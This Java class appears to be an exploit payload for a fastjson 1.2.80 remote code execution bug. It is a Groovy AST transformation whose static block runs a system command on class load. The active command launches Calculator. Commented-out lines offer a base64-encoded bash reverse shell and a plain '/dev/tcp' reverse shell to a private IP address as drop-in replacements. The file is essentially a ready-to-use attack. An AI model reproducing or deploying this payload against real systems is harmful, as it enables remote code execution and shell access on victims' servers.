import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

/**
 * for fastjson 1.2.80 RCE
 */
@GroovyASTTransformation
public class AttackThatShit implements ASTTransformation {
    static {
        try {
//            Runtime.getRuntime().exec("touch /tmp/sususu.txt");
            Runtime.getRuntime().exec("open -a Calculator");
//            Runtime.getRuntime().exec("/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQzIDA+JjE=}|{base64,-d}|{bash,-i}");
//            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.166.233/4444 0>&1"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {

    }
}
